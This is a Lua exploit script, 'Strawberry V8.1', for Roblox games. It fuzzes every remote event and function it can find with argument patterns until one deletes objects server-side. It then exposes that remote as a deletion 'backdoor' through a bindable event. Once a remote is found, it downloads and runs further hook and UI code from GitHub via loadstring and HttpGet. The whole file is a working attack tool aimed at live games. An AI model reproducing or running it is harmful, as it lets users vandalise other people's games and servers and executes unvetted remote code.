-- Strawberry V8.1 Scanner - Now with less hanging
-- by sane
-- //===================[ CONFIG ]===================//
local Config = {
InvokeTimeout = 0.5, -- // seconds to wait for a RemoteFunction before giving up
ScanSafeTime = 0.1,
EnableGUIAfterScan = true,
ShowScannerProgress = true
}
-- //===================[ CORE SETUP ]===================//
local Services = {
Players = game:GetService("Players"),
ReplicatedStorage = game:GetService("ReplicatedStorage"),
StarterGui = game:GetService("StarterGui"),
Workspace = game:GetService("Workspace"),
RunService = game:GetService("RunService")
}
local LocalPlayer = Services.Players.LocalPlayer
local Hint
if Config.ShowScannerProgress then
Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V8.1: Initializing scanner..."
end
local function Notify(message, duration)
pcall(function()
Services.StarterGui:SetCore("SendNotification", {
Title = "Strawberry V8.1",
Text = tostring(message),
Duration = duration or 7.5,
})
end)
end
shared.strawberry = {
vulnRemote = nil,
fireMethod = nil,
vulnType = "None"
}
-- //===================[ SCANNER ]===================//
local function isDestroyed(obj, originalParent)
return obj == nil or obj.Parent ~= originalParent
end
local function safeInvoke(remote, args)
local success, result
local invoker = coroutine.create(function()
success, result = pcall(function()
return remote:InvokeServer(unpack(args))
end)
end)
	coroutine.resume(invoker)

local timer = 0
while coroutine.status(invoker) ~= "dead" and timer < Config.InvokeTimeout do
    timer = timer + task.wait()
end

if coroutine.status(invoker) ~= "dead" then
    print("STRAWBERRY V8.1: InvokeServer timed out on " .. remote:GetFullName())
    return false, "timeout"
end

return success, result
	end
local function checkVulnerability(remote)
local testPart = Instance.new("Part", LocalPlayer.Character)
testPart.Name = "StrawberryTestPart_" .. math.random(1000,9999)
testPart.Anchored = false
testPart.CanCollide = false
testPart.Size = Vector3.new(1,1,1)
	local originalParent = testPart.Parent

local argPermutations = {
	{testPart},
	{nil, testPart},
	{nil, nil, testPart},
	{"Destroy", testPart},
	{"delete", testPart},
	{"remove", testPart},
	{testPart.Name},
	{{"Target", testPart}},
	{{"object", testPart}, {"action", "delete"}}
}

for i, args in ipairs(argPermutations) do
    if remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer(unpack(args)) end)
    elseif remote:IsA("RemoteFunction") then
        safeInvoke(remote, args)
    end
	
	task.wait(Config.ScanSafeTime)

	if isDestroyed(testPart, originalParent) then
		print("STRAWBERRY V8.1: DELETION VULNERABILITY CONFIRMED! Remote: " .. remote:GetFullName() .. " Pattern #" .. i)
		shared.strawberry.vulnRemote = remote
		shared.strawberry.fireMethod = function(target)
			local newArgs = {}
			for _, arg in ipairs(args) do
				if arg == testPart then
					table.insert(newArgs, target)
				else
					table.insert(newArgs, arg)
				end
			end
			pcall(function() 
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(unpack(newArgs)) 
                elseif remote:IsA("RemoteFunction") then
                    safeInvoke(remote, newArgs)
                end
            end)
		end
		shared.strawberry.vulnType = "Deletion"
        if testPart and testPart.Parent then testPart:Destroy() end
		return true
	end
end

if testPart and testPart.Parent then testPart:Destroy() end
return false
	end
local function Scan()
local scanStartTime = tick()
local remotesToScan = {}
local locations = {
Services.ReplicatedStorage,
Services.Workspace,
Services.StarterGui,
game:GetService("Lighting"),
LocalPlayer.PlayerGui
}
for _, root in ipairs(locations) do
	for _, descendant in ipairs(root:GetDescendants()) do
		if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
			if descendant.Parent and descendant.Parent.Name ~= "RobloxReplicatedStorage" and descendant.Parent.Name ~= "DefaultChatSystemChatEvents" then
				table.insert(remotesToScan, descendant)
			end
		end
	end
end

if #remotesToScan == 0 then
	if Hint then Hint.Text = "STRAWBERRY V8.1: No remotes found to scan. Lame ass game." end
	return
end

for i, remote in ipairs(remotesToScan) do
	if shared.strawberry.vulnRemote then break end
	if Hint then Hint.Text = string.format("STRAWBERRY V8.1: Fuzzing... (%d/%d) | %s", i, #remotesToScan, remote.Name) end
	
	if checkVulnerability(remote) then
		break
	end
end

local scanDuration = tick() - scanStartTime
if shared.strawberry.vulnRemote then
	if Hint then Hint.Text = string.format("STRAWBERRY V8.1: Backdoor located in %.2fs. Remote: %s", scanDuration, shared.strawberry.vulnRemote.Name) end
	Notify("Backdoor found: " .. shared.strawberry.vulnRemote:GetFullName(), 10)
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/Hook.lua"))()
	if Config.EnableGUIAfterScan then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v7.lua"))()
	end

else
	if Hint then Hint.Text = "STRAWBERRY V8.1: Scan complete. No vulnerable remotes found. This game is patched." end
	Notify("Scan complete. No vulnerable remotes found.", 10)
end

if Hint then
	task.wait(10)
	Hint:Destroy()
end
	end
-- //===================[ EXECUTION ]===================//
if LocalPlayer:FindFirstChild("deletebind") then LocalPlayer.deletebind:Destroy() end
local deleteBind = Instance.new("BindableEvent", LocalPlayer)
deleteBind.Name = "deletebind"
deleteBind.Event:Connect(function(target)
if shared.strawberry and shared.strawberry.fireMethod then
shared.strawberry.fireMethod(target)
else
warn("Strawberry: deletebind fired but no vulnerability is loaded.")
end
end)
task.wait(1)
Scan()
